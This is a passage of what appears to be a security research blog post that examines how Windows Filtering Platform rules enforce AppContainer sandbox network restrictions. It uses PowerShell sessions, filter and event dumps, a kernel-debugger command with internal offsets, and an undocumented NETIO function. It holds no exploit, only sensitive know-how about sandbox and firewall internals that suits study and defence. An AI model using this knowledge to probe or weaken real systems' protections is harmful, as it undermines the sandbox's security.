\device\harddiskvolume3\windows\system32\wind...&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;UserId &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;: S-1-5-21-4266194842-3460360287-487498758-1103&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;AddressFamily &amp;nbsp; : Inet&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;PackageSid &amp;nbsp; &amp;nbsp; &amp;nbsp;: S-1-0-0&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span&gt;First we enable the &lt;/span&gt;&lt;span class="c7"&gt;ClassifyAllow &lt;/span&gt;&lt;span&gt;event, which is generated when a firewall event is permitted. By default only firewall blocks are recorded using the &lt;/span&gt;&lt;span class="c7"&gt;ClassifyDrop &lt;/span&gt;&lt;span&gt;event to avoid filling the small network event log with too much data. Next we make a connection to the Google web server we queried earlier to generate an event. We then disable the &lt;/span&gt;&lt;span class="c7"&gt;ClassifyAllow &lt;/span&gt;&lt;span class="c2"&gt;events again to reduce the risk we&amp;#39;ll lose the event.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span&gt;Next we can query for the current stored events using &lt;/span&gt;&lt;span class="c7"&gt;Get-FwNetEvent&lt;/span&gt;&lt;span&gt;. To limit the network events returned to us we can specify a template in a similar way to when we queried for filters. In this case we create a new template using the &lt;/span&gt;&lt;span class="c7"&gt;New-FwNetEventTemplate&lt;/span&gt;&lt;span&gt;&amp;nbsp;command and copy the existing conditions from our filter template. We then add a condition to match on only &lt;/span&gt;&lt;span class="c7"&gt;ClassifyAllow &lt;/span&gt;&lt;span class="c2"&gt;events.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span&gt;Formatting the results we can see the network connection event to TCP port 80. Crucially if you compare the &lt;/span&gt;&lt;span class="c7"&gt;FilterId &lt;/span&gt;&lt;span&gt;value to the &lt;/span&gt;&lt;span class="c7"&gt;Id &lt;/span&gt;&lt;span class="c2"&gt;fields in the two enumerated filters we match the first filter. This gives us confidence that we have a basic understanding of how the filtering works. Let&amp;#39;s move on to running some tests to determine how the AppContainer network restrictions are implemented through WFP.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span&gt;Worth noting at this point that because the network event buffer can be small, of the order of 30-40 events depending on load, it&amp;#39;s possible on a busy server that events might be lost before you query for them. You can get a real-time trace of events by using the &lt;/span&gt;&lt;span class="c7"&gt;Start-FwNetEventListener&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;command to avoid losing events.&lt;/span&gt;&lt;/p&gt;&lt;h2 class="c26" id="h.o4gwdt98hsge"&gt;&lt;span class="c25"&gt;Callout Drivers&lt;/span&gt;&lt;/h2&gt; &lt;p class="c4"&gt;&lt;span&gt;As mentioned a developer can implement their own custom functionality to inspect and modify network traffic. This functionality is used by various different products, ranging from AV to scan your network traffic for badness to NMAP&amp;#39;s NPCAP &lt;/span&gt;&lt;span class="c13"&gt;&lt;a class="c111" href="https://github.com/nmap/npcap/blob/master/packetWin7/npf/npf/Loopback.c"&gt;capturing loopback traffic&lt;/a&gt;&lt;/span&gt;&lt;span class="c2"&gt;. &lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span&gt;To set up a callout the developer needs to do two things. First they need to register its callback functions for the callout using the &lt;/span&gt;&lt;span class="c13"&gt;&lt;a class="c111" href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/fwpsk/nf-fwpsk-fwpscalloutregister2"&gt;FwpmCalloutRegister&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;API in the &lt;/span&gt;&lt;span class="c13"&gt;&lt;a class="c111" href="https://docs.microsoft.com/en-us/windows-hardware/drivers/network/roadmap-for-developing-wfp-callout-drivers"&gt;kernel driver&lt;/a&gt;&lt;/span&gt;&lt;span&gt;. Second they need to create a filter to use the callout by specifying the &lt;/span&gt;&lt;span class="c13"&gt;&lt;a class="c111" href="https://docs.microsoft.com/en-us/windows/win32/api/fwpmtypes/ns-fwpmtypes-fwpm_filter0"&gt;providerContextKey&lt;/a&gt;&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;GUID and one of the action types which invoke a callout.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span&gt;You can query the list of registered callouts using the &lt;/span&gt;&lt;span class="c13"&gt;&lt;a class="c111" href="https://docs.microsoft.com/en-us/windows/win32/api/fwpmu/nf-fwpmu-fwpmcalloutenum0"&gt;FwpmCalloutEnum0&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;API in user-mode. I expose this API through the &lt;/span&gt;&lt;span class="c7"&gt;Get-FwCallout&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;command.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.2396b12a8028cda722ae1b6b81be45210a76e4c9"&gt;&lt;/a&gt;&lt;a id="t.12"&gt;&lt;/a&gt;&lt;table class="c10"&gt;&lt;tbody&gt;&lt;tr class="c12"&gt;&lt;td class="c19" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c14"&gt;PS&amp;gt; &lt;/span&gt;&lt;span class="c8"&gt;Get-FwCallout | Sort CalloutId | Select CalloutId, KeyName&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;CalloutId KeyName&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;--------- -------&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; 1 FWPM_CALLOUT_IPSEC_INBOUND_TRANSPORT_V4&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; 2 FWPM_CALLOUT_IPSEC_INBOUND_TRANSPORT_V6&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; 3 FWPM_CALLOUT_IPSEC_OUTBOUND_TRANSPORT_V4&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; 4 FWPM_CALLOUT_IPSEC_OUTBOUND_TRANSPORT_V6&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; 5 FWPM_CALLOUT_IPSEC_INBOUND_TUNNEL_V4&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; 6 FWPM_CALLOUT_IPSEC_INBOUND_TUNNEL_V6&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;...&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span&gt;The above output shows the callouts listed by their callout ID numbers. &lt;/span&gt;&lt;span&gt;The ID number is key&lt;/span&gt;&lt;span&gt;&amp;nbsp;to finding the callback functions in the kernel. &lt;/span&gt;&lt;span&gt;There doesn&amp;#39;t seem to be a way of enumerating the addresses of callout functions directly (at least from user mode). &lt;/span&gt;&lt;span class="c13"&gt;&lt;a class="c111" href="https://codemachine.com/articles/find_wfp_callouts.html"&gt;This article&lt;/a&gt;&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;shows a basic approach to extract the callback functions using a kernel debugger, although it&amp;#39;s a little out of date.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span&gt;The NETIO driver stores all registered callbacks in a large array, the index being the callout ID. If you want to find a specific callout then find the base of the array using the description in the article then just calculate the offset based on a single callout structure and the index. For example on Windows 10 21H1 x64 the following command will dump a callout&amp;#39;s classify callback function. Replace N with the callout ID, the magic numbers 198 and 50 are the offset into the &lt;/span&gt;&lt;span class="c7"&gt;gWfpGlobal &lt;/span&gt;&lt;span class="c2"&gt;global data table and the size of a callout entry which you can discover through analyzing the code.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.f1b35794a1a1f1389c2e1ccd4bbd950f2fba28f2"&gt;&lt;/a&gt;&lt;a id="t.13"&gt;&lt;/a&gt;&lt;table class="c10"&gt;&lt;tbody&gt;&lt;tr class="c12"&gt;&lt;td class="c40" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c18"&gt;0: kd&amp;gt; ln poi(poi(poi(NETIO!gWfpGlobal)+198)+(50*N)+10)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span&gt;If you&amp;#39;re in kernel mode there&amp;#39;s an undocumented &lt;/span&gt;&lt;span class="c7"&gt;KfdGetRefCallout&lt;/span&gt;&lt;span&gt;&amp;nbsp;function (and a corresponding &lt;/span&gt;&lt;span class="c7"&gt;KfdDeRefCallout&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;to decrement the reference) exported by NETIO which will return a pointer to the internal callout structure based on the ID avoiding the need to extract the offsets from disassembly. &lt;/span&gt;&lt;/p&gt;&lt;h2 class="c26" id="h.uaafke7sw96h"&gt;&lt;span class="c25"&gt;AppContainer Network Restrictions&lt;/span&gt;&lt;/h2&gt; &lt;p class="c4"&gt;&lt;span&gt;The basics of accessing the network from an AppContainer sandbox is documented by Microsoft. Specifically the lowbox token used for the sandbox needs to have one or more &lt;/span&gt;&lt;span class="c13"&gt;&lt;a class="c111" href="https://docs.microsoft.com/en-us/windows/uwp/packaging/app-capability-declarations"&gt;capabilities&lt;/a&gt;&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;enabled to grant access to the network. The three capabilities are:&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt;&lt;ul style="padding: 0;" class="c17 lst-kix_a73fbzj8zqo2-0 start"&gt;&lt;li style="margin-left: 46pt;" class="c4 c29 li-bullet-0"&gt;&lt;span class="c2"&gt;internetClient - Grants client access to the Internet&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c4 c29 li-bullet-0"&gt;&lt;span class="c2"&gt;internetClientServer - Grants client and server access to the Internet&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c4 c29 li-bullet-0"&gt;&lt;span class="c2"&gt;privateNetworkClientServer - Grants client and server access to local private networks.&lt;/span&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h3 class="c33" id="h.bfr60co2drv2"&gt;&lt;span class="c16"&gt;Client Capabilities&lt;/span&gt;&lt;/h3&gt; &lt;p class="c4"&gt;&lt;span&gt;Pretty much all Windows Store applications are granted the &lt;/span&gt;&lt;span class="c7"&gt;internetClient &lt;/span&gt;&lt;span class="c2"&gt;capability as accessing the Internet is a thing these days. Even the built-in calculator has this capability, presumably so you can fill in feedback on how awesome a calculator it is.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span class="c7 c34"&gt;&lt;a href="https://1.bp.blogspot.com/-u6QDoqjHlPg/YRw9ljm_O1I/AAAAAAAAbhU/BFs39RCd3XseTb1d1VUtn6xhjf3jtmobgCNcBGAsYHQ/s789/calculator.PNG" style="display: block; padding: 1em 0;text-align: center;"&gt;&lt;img src="https://1.bp.blogspot.com/-u6QDoqjHlPg/YRw9ljm_O1I/AAAAAAAAbhU/BFs39RCd3XseTb1d1VUtn6xhjf3jtmobgCNcBGAsYHQ/s600/calculator.PNG" border="0" alt="Image showing the list of capabilities granted to Windows calculator application showing the &amp;ldquo;Your Internet Connection&amp;rdquo; capability is granted." style="max-height: 750; max-width: 600;" /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c34 c7"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span&gt;However, this shouldn&amp;#39;t grant the ability to act as a network server, for that you need the &lt;/span&gt;&lt;span class="c7"&gt;internetClientServer&lt;/span&gt;&lt;span&gt;&amp;nbsp;capability. Note that Windows defaults to blocking incoming connections, so just because you have the server capability still doesn&amp;#39;t ensure you can receive network connections. The final capability is &lt;/span&gt;&lt;span class="c7"&gt;privateNetworkClientServer&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;which grants access to private networks as both a client and a server. What is the internet and what is private isn&amp;#39;t made immediately clear, hopefully we&amp;#39;ll find out from inspecting the firewall configuration.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.726560f1dcc0a391c92acef89ed310e6111d9ba1"&gt;&lt;/a&gt;&lt;a id="t.14"&gt;&lt;/a&gt;&lt;table class="c10"&gt;&lt;tbody&gt;&lt;tr class="c12"&gt;&lt;td class="c19" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c14"&gt;PS&amp;gt; &lt;/span&gt;&lt;span class="c8"&gt;$token = Get-NtToken -LowBox -PackageSid TEST&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c14"&gt;PS&amp;gt; &lt;/span&gt;&lt;span class="c8"&gt;$addr = Resolve-DnsName &amp;quot;www.google.com&amp;quot; -Type A&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c14"&gt;PS&amp;gt; &lt;/span&gt;&lt;span class="c8"&gt;$sock = Invoke-NtToken $token {&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c8"&gt;&amp;gt;&amp;gt; &amp;nbsp; [System.Net.Sockets.TcpClient]::new($addr.IPAddress, 80)&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c8"&gt;&amp;gt;&amp;gt; }&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c20"&gt;Exception calling &amp;quot;.ctor&amp;quot; with &amp;quot;2&amp;quot; argument(s): &amp;quot;An attempt was made to access a socket in a way forbidden by its access permissions 216.58.194.164:80&amp;quot;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c21"&gt;&lt;span class="c20"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c14"&gt;PS&amp;gt; &lt;/span&gt;&lt;span class="c8"&gt;$template = New-FwNetEventTemplate&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c14"&gt;PS&amp;gt; &lt;/span&gt;&lt;span class="c8"&gt;Add-FwCondition $template -IPAddress $addr.IPAddress -Port 80&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c14"&gt;PS&amp;gt; &lt;/span&gt;&lt;span class="c8"&gt;Add-FwCondition $template -NetEventType ClassifyDrop&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c14"&gt;PS&amp;gt; &lt;/span&gt;&lt;span class="c8"&gt;Get-FwNetEvent -Template $template | Format-List&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c21"&gt;&lt;span class="c8"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;FilterId &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; : 71079&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;LayerId &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;: 48&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;ReauthReason &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; : 0&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;...&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c21"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c14"&gt;PS&amp;gt; &lt;/span&gt;&lt;span class="c8"&gt;Get-FwFilter -Id 71079 | Format-FwFilter&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Name &amp;nbsp; &amp;nbsp; &amp;nbsp; : Block Outbound Default Rule&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Action Type: Block&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Key &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;: fb8f5cab-1a15-4616-b63f-4a0d89e527f8&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Id &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; : 71079&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Description: Block Outbound Default Rule&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Layer &amp;nbsp; &amp;nbsp; &amp;nbsp;: FWPM_LAYER_ALE_AUTH_CONNECT_V4&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Sub Layer &amp;nbsp;: MICROSOFT_DEFENDER_SUBLAYER_WSH&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Flags &amp;nbsp; &amp;nbsp; &amp;nbsp;: None&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Weight &amp;nbsp; &amp;nbsp; : 274877906944&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Conditions :&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;FieldKeyName &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;MatchType Value&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;------------ &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;--------- -----&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;FWPM_CONDITION_ALE_PACKAGE_ID NotEqual &amp;nbsp;NULL SID&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span&gt;In the above output we first create a lowbox token for testing the AppContainer access. In this example we don&amp;#39;t provide any capabilities for the token so we&amp;#39;re expecting the network connection should fail. Next we connect a &lt;/span&gt;&lt;span class="c13"&gt;&lt;a class="c111" href="https://docs.microsoft.com/en-us/dotnet/api/system.net.sockets.tcpclient?view=net-5.0"&gt;TcpClient&lt;/a&gt;&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;socket while impersonating the lowbox token, and the connection is immediately blocked with an error. &lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span&gt;We then get the network event corresponding to the connection request to see what filter blocked the connection. Formatting the filter from the network event we find the &amp;ldquo;Block Outbound Default Rule&amp;rdquo;. This will block any AppContainer network connection, based on the &lt;/span&gt;&lt;span class="c7"&gt;FWPM_CONDITION_ALE_PACKAGE_ID&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;condition which hasn&amp;#39;t been permitted by higher priority firewall filters. &lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span&gt;Like with the &amp;ldquo;Default Outbound&amp;rdquo; filter we saw earlier, this is a backstop if nothing else matches. Unlike that earlier filter the default is to block rather than permit the connection. Another thing to note is the sublayer name. For &amp;ldquo;Block Outbound Default Rule&amp;rdquo; it&amp;#39;s &lt;/span&gt;&lt;span class="c7"&gt;MICROSOFT_DEFENDER_SUBLAYER_WSH&lt;/span&gt;&lt;span&gt;&amp;nbsp;which is used for built-in filters which aren&amp;#39;t directly visible from the Defender firewall configuration. Whereas &lt;/span&gt;&lt;span class="c7"&gt;MICROSOFT_DEFENDER_SUBLAYER_FIREWALL&lt;/span&gt;&lt;span class="c2"&gt;&amp;nbsp;is used for &amp;ldquo;Default Outbound&amp;rdquo;, which is a lower priority sublayer (based on its weight) and thus would never be evaluated due to the higher priority block.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c4"&gt;&lt;span&gt;Okay, we know how connections are blocked. Therefore there must be a higher priority filter which permits the connection within the &lt;/span&gt;&lt;span class="c7"&gt;MICROSOFT_DEFENDER_SUBLAYER_WSH&lt;/span&gt;&lt;span&gt;&amp;nbsp;sublayer. We could go back to manual inspection, but we might as well just see what the network event shows as the matching filter when we grant the &lt;/span&gt;&lt;span class="c7"&gt;internetClient&lt;/span&gt;&lt;span&gt;&amp;nbsp;capability.&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.11ccdcf255abcf42d021e19361ea96cb417403f3"&gt;&lt;/a&gt;&lt;a id="t.15"&gt;&lt;/a&gt;&lt;table class="c10"&gt;&lt;tbody&gt;&lt;tr class="c12"&gt;&lt;td class="c19" colspan="1" rowspan="1"&gt; &lt;p class="c1"&gt;&lt;span class="c14"&gt;PS&amp;gt; &lt;/span&gt;&lt;span class="c8"&gt;$cap = Get-NtSid -KnownSid CapabilityInternetClient&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c14"&gt;PS&amp;gt; &lt;/span&gt;&lt;span class="c8"&gt;$token = Get-NtToken -LowBox -PackageSid TEST -CapabilitySid $cap&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c14"&gt;PS&amp;gt; &lt;/span&gt;&lt;span class="c8"&gt;Set-FwEngineOption -NetEventMatchAnyKeywords ClassifyAllow&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c14"&gt;PS&amp;gt; &lt;/span&gt;&lt;span class="c8"&gt;$sock = Invoke-NtToken $token {&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c8"&gt;&amp;gt;&amp;gt; &amp;nbsp; [System.Net.Sockets.TcpClient]::new($addr.IPAddress, 80)&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c23"&gt;&amp;gt;&amp;gt; }&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c14"&gt;PS&amp;gt; &lt;/span&gt;&lt;span class="c8"&gt;Set-FwEngineOption -NetEventMatchAnyKeywords None&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c14"&gt;PS&amp;gt; &lt;/span&gt;&lt;span class="c23"&gt;$template = New-FwNetEventTemplate&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c14"&gt;PS&amp;gt; &lt;/span&gt;&lt;span class="c8"&gt;Add-FwCondition $template -IPAddress $addr.IPAddress -Port 80&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c14"&gt;PS&amp;gt; &lt;/span&gt;&lt;span class="c8"&gt;Add-FwCondition $template -NetEventType ClassifyAllow&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c14"&gt;PS&amp;gt; &lt;/span&gt;&lt;span class="c8"&gt;Get-FwNetEvent -Template $template | Format-List&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c21"&gt;&lt;span class="c8"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;FilterId &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;: 71075&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;LayerId &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; : 48&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;ReauthReason &amp;nbsp; &amp;nbsp;: 0&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;...&lt;/span&gt;&lt;/p&gt; &lt;p class="c1 c21"&gt;&lt;span class="c0"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c14"&gt;PS&amp;gt; &lt;/span&gt;&lt;span class="c8"&gt;Get-FwFilter -Id 71075 | Format-FwFilter&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Name &amp;nbsp; &amp;nbsp; &amp;nbsp; : InternetClient Default Rule&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Action Type: Permit&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Key &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;: 406568a7-a949-410d-adbb-2642ec3e8653&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Id &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; : 71075&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Description: InternetClient Default Rule&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Layer &amp;nbsp; &amp;nbsp; &amp;nbsp;: FWPM_LAYER_ALE_AUTH_CONNECT_V4&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Sub Layer &amp;nbsp;: MICROSOFT_DEFENDER_SUBLAYER_WSH&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Flags &amp;nbsp; &amp;nbsp; &amp;nbsp;: None&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Weight &amp;nbsp; &amp;nbsp; : 412316868544&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Conditions :&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;FieldKeyName &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; MatchType Value&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;------------ &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; --------- -----&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;FWPM_CONDITION_ALE_PACKAGE_ID &amp;nbsp; &amp;nbsp; &amp;nbsp;NotEqual &amp;nbsp;NULL SID&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;FWPM_CONDITION_IP_REMOTE_ADDRESS &amp;nbsp; Range &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span class="c0"&gt;Low: 0.0.0.0 High: 255.255.255.255&lt;/span&gt;&lt;/p&gt; &lt;p class="c1"&gt;&lt;span 